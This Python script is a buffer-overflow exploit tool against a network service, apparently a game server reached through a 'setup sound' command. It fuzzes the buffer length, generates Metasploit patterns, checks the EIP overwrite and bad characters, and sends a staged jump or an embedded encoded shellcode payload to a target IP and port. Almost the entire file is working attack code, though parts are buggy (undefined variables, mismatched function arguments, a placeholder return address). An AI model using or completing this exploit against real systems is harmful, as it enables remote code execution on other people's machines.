#!/usr/bin/python
import socket, time, sys, os
from optparse import OptionParser

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10""\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20""\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30""\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40""\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50""\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60""\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70""\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80""\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90""\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0""\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0""\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0""\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0""\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0""\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0""\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

def replace_payload(term, payload, inputBuffer):
    new_payload = payload.replace(bytes(term), bytes(inputBuffer))
    return new_payload.strip('\n')

def fuzz_find_buf_len(ip, port, payload):
    server = ip
    sport = port
        
    size = 3000

    while(size <= 5000):
        inputBuffer = "A" * int(size)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((server, int(sport)))
        print(s.recv(1024))
        print("Sending buffer of size {0} ".format(size))
        
        s.send((replace_payload('PAYLOAD', payload, inputBuffer)))
        print(s.recv(1024))
        s.close()
        size += 100
        time.sleep(5)
        print("\nDone!")

def get_msf_pattern(msf_length):

    print('Fuzzing with MSF pattern...')
    msfpattern = os.popen('msf-pattern_create -l ' + msf_length).read()
    # print('msf-pattern_create: {0}'.format(msfpattern))
    inputBuffer = msfpattern.strip('\n')

def get_buffer_verify_eip_overwrite(filler_len, buffer_len, eip):
    filler = "\x41" * filler_len
    buffer = "\x43" * buffer_len
    inputBuffer = filler + eip + buffer
    return inputBuffer

def get_staged_buffer(filler_len, buffer_len, eip):
    padding = "\x41" * 4368
    first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
    inputBuffer = padding + eip + first_stage
    return inputBuffer

def get_buffer_bad_characters(filler_len, buffer_len, eip, staged):
    filler = "\x41" * filler_len
    buffer = "\x43" * buffer_len
    if(staged == True):
        print("Staged buffer set...")
        inputBuffer = filler + badchars + eip + buffer
    else:
        inputBuffer = filler + eip + buffer + badchars
    return inputBuffer


def send_payload(ip, port, options):
    try:
        server = ip
        sport = port

        shellcode = ("\xbd\xbc\x54\xe4\x95\xd9\xd0\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x68\x12\x83\xe8\xfc\x03\xd4\x5a\x06\x60\xd8\x8b\x44"
"\x8b\x20\x4c\x29\x05\xc5\x7d\x69\x71\x8e\x2e\x59\xf1\xc2\xc2"
"\x12\x57\xf6\x51\x56\x70\xf9\xd2\xdd\xa6\x34\xe2\x4e\x9a\x57"
"\x60\x8d\xcf\xb7\x59\x5e\x02\xb6\x9e\x83\xef\xea\x77\xcf\x42"
"\x1a\xf3\x85\x5e\x91\x4f\x0b\xe7\x46\x07\x2a\xc6\xd9\x13\x75"
"\xc8\xd8\xf0\x0d\x41\xc2\x15\x2b\x1b\x79\xed\xc7\x9a\xab\x3f"
"\x27\x30\x92\x8f\xda\x48\xd3\x28\x05\x3f\x2d\x4b\xb8\x38\xea"
"\x31\x66\xcc\xe8\x92\xed\x76\xd4\x23\x21\xe0\x9f\x28\x8e\x66"
"\xc7\x2c\x11\xaa\x7c\x48\x9a\x4d\x52\xd8\xd8\x69\x76\x80\xbb"
"\x10\x2f\x6c\x6d\x2c\x2f\xcf\xd2\x88\x24\xe2\x07\xa1\x67\x6b"
"\xeb\x88\x97\x6b\x63\x9a\xe4\x59\x2c\x30\x62\xd2\xa5\x9e\x75"
"\x15\x9c\x67\xe9\xe8\x1f\x98\x20\x2f\x4b\xc8\x5a\x86\xf4\x83"
"\x9a\x27\x21\x03\xca\x87\x9a\xe4\xba\x67\x4b\x8d\xd0\x67\xb4"
"\xad\xdb\xad\xdd\x44\x26\x26\x22\x30\x4b\xdd\xca\x43\x8b\x02"
"\x21\xcd\x6d\x2e\x25\x9b\x26\xc7\xdc\x86\xbc\x76\x20\x1d\xb9"
"\xb9\xaa\x92\x3e\x77\x5b\xde\x2c\xe0\xab\x95\x0e\xa7\xb4\x03"
"\x26\x2b\x26\xc8\xb6\x22\x5b\x47\xe1\x63\xad\x9e\x67\x9e\x94"
"\x08\x95\x63\x40\x72\x1d\xb8\xb1\x7d\x9c\x4d\x8d\x59\x8e\x8b"
"\x0e\xe6\xfa\x43\x59\xb0\x54\x22\x33\x72\x0e\xfc\xe8\xdc\xc6"
"\x79\xc3\xde\x90\x85\x0e\xa9\x7c\x37\xe7\xec\x83\xf8\x6f\xf9"
"\xfc\xe4\x0f\x06\xd7\xac\x20\x4d\x75\x84\xa8\x08\xec\x94\xb4"
"\xaa\xdb\xdb\xc0\x28\xe9\xa3\x36\x30\x98\xa6\x73\xf6\x71\xdb"
"\xec\x93\x75\x48\x0c\xb6")

        payload = b"\x11(setup sound PAYLOAD\x90\x00#"

        eip = "A" * 4

        stager = ""

        if(options.fuzz != None):
            fuzz_find_buf_len(ip, port, payload)
            return

        if(options.fuzzpattern != None):
            #fuzz_with_pattern(sys.argv[1], sys.argv[2], payload, options.fuzzpattern)
            inputBuffer = get_msf_pattern(options.fuzzpattern)

        if(options.verifyeip != None):
            #verify_eip_overwrite(sys.argv[1], sys.argv[2], payload, options.verifyeip[0], options.verifyeip[1])
            inputBuffer = get_buffer_verify_eip_overwrite(options.verifyeip[0], options.verifyeip[1], eip)

        if(options.testbadchars != None):
            #fuzz_with_bad_characters(sys.argv[1], sys.argv[2], payload, options.testbadchars[0], options.testbadchars[1])
            if(options.stagedbuffer != None):
                staged = True
            else: 
                staged = False
            inputBuffer = get_buffer_bad_characters(options.testbadchars[0], options.testbadchars[1], eip, staged)
        
            

        if(options.sendpayload != None):
            #send_payload(sys.argv[1], sys.argv[2], payload, options.sendpayload[0], eip, options.sendpayload[1], shellcode)\
            if(options.stagedbuffer != None):
                print("Staged buffer set...")
                inputBuffer = get_staged_buffer(options.sendpayload[0], eip, options.sendpayload[1], eip)
            else: 
                filler = "A" * filler_len
                #eip = '\xAF\x11\x50\x62'
                offset = "C" * offset_len
                nops = "\x90" * 10
                inputBuffer = filler + eip + offset + nops + shellcode 
        
        # buffer = "D" * (2500 - len(filler) - len(eip) - len(offset))
        
        print("Input buffer:\n {0}".format(inputBuffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((server, int(sport)))
        print(s.recv(1024))
        print("Sending buffer of size {0} ".format(len(inputBuffer)))
        s.send((replace_payload('PAYLOAD', payload, inputBuffer)))
        print(s.recv(1024))
        s.close()
        print("\nDone!")
    except Exception as e: 
        print(e)
        print("Could not connect!")
        sys.exit()

if len(sys.argv) <= 2:
    print("IP and Port are required! Basic usage: bof.py <ip-address> <destination-port>\nSee help for more")
    sys.exit(0)

#fuzz_find_buf_len(sys.argv[1], sys.argv[2])
usage = "usage: %prog [options] arg1 arg2"
parser = OptionParser(usage=usage)
parser.add_option("-f", "--fuzz", dest="fuzz",
                  help="Fuzz for length of buffer", action="store_false")
parser.add_option("-p", "--fuzz-with-pattern",
                  action="store", dest="fuzzpattern",
                  help="Supply length of msf pattern")
parser.add_option("-v", "--verify",
                  action="store", dest="verifyeip", type="int", nargs=2,
                  help="Verify EIP is being overwritten with B's")
parser.add_option("-t", "--test-bad-characters",
                  action="store", dest="testbadchars", type="int", nargs=2,
                  help="Test bad characters. Supply length of filler buffer and buffer length and if it is staged or not")
parser.add_option("-s", "--send-payload",
                  action="store", dest="sendpayload", type="int", nargs=2,
                  help="Send shellcode payload to target. Supply length of filler buffer and offset length" )
parser.add_option("-g", "--send-stage-payload",
                  action="store_false", dest="stagedbuffer",
                  help="Set this flag if you're sending a staged payload" )

(options, args) = parser.parse_args()

print(badchars)

send_payload(sys.argv[1], sys.argv[2], options)

